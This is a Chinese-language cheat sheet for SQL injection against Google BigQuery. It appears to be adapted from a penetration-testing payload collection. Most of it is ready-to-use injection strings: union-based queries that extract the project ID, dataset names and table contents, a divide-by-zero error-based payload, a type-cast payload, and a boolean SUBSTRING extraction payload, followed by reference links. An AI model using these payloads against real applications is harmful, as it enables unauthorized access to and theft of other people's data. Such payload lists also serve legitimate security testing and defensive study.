# 谷歌BigQuery SQL注入

> 谷歌BigQuery SQL注入是一种安全漏洞类型，攻击者可以通过操纵用户输入（这些输入未经过适当清理）来执行任意SQL查询在谷歌BigQuery数据库中。这可能导致未经授权的数据访问、数据篡改或其他恶意活动。

## 概述

* [检测](#检测)
* [BigQuery注释](#bigquery注释)
* [基于BigQuery联合的](#基于bigquery联合的)
* [基于BigQuery错误的](#基于bigquery错误的)
* [基于BigQuery布尔的](#基于bigquery布尔的)
* [基于BigQuery时间的](#基于bigquery时间的)
* [参考](#参考)

## 检测

* 使用经典的单引号触发错误：`'`
* 使用反引号符号标识BigQuery：```SELECT .... FROM `` AS ...``

| SQL查询                                              | 描述                 |
| ---------------------------------------------------- | -------------------- |
| `SELECT @@project_id`                                | 获取项目ID           |
| `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA` | 获取所有数据集名称   |
| `select * from project_id.dataset_name.table_name`   | 从特定项目ID和数据集中获取数据 |

## BigQuery注释

| 类型                       | 描述                 |
|----------------------------|--------------------|
| `#`                        | 哈希注释            |
| `/* PostgreSQL注释 */`     | C风格注释           |

## 基于BigQuery联合的

```ps1
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#
```

## 基于BigQuery错误的

| SQL查询                                                | 描述         |
| ------------------------------------------------------ | ----------- |
| `' OR if(1/(length((select('a')))-1)=1,true,false) OR '` | 零除错误     |
| `select CAST(@@project_id AS INT64)`                  | 类型转换     |

## 基于BigQuery布尔的

```ps1
' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#
```

## 基于BigQuery时间的

* BigQuery语法中不存在基于时间的函数。

## 参考

* [BigQuery SQL注入速查表 - Ozgur Alp - 2022年2月14日](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)
* [BigQuery文档 - 查询语法 - 2024年10月30日](https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax)
* [BigQuery文档 - 函数和运算符 - 2024年10月30日](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
* [Akamai Web应用防火墙绕过之旅：利用“谷歌BigQuery”SQL注入漏洞 - Duc Nguyen - 2020年3月31日](https://hackemall.live/index.php/2020/03/31/akamai-web-application-firewall-bypass-journey-exploiting-google-bigquery-sql-injection-vulnerability/)